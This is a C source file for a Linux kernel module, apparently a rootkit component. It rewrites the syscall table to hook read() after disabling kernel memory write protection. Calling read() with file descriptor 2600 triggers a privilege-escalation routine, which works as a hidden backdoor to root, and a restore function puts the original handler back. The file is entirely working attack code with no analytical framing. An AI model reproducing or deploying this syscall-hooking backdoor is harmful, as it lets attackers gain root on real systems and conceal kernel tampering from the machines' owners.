#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#include "../hooking.h"
#include "h_read.h"

sysfun_t old_read;

void hijack_read(void)
{
    unsigned long old_cr0 = unprotect_memory();

    old_read = (sysfun_t)syscall_table[__NR_read];
    m_printd(KERN_INFO "Old read @ %p", old_read);

    syscall_table[__NR_read] = (uint64_t)new_read;
    m_printd(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
    protect_memory(old_cr0);
}

int new_read(struct pt_regs *regs)
{
    int fd = (int)regs->di;
    void *buf = (void *)regs->si;
    size_t count = (size_t)regs->dx;

    int retval;
    if (fd == 2600)
    {
        privesc(); 
        return 0;
    }

    retval = old_read(regs);

    return retval;
}

void restore_read(void)
{
    unsigned long old_cr0 = unprotect_memory();
    syscall_table[__NR_read] = (uint64_t)old_read;
    protect_memory(old_cr0);
}
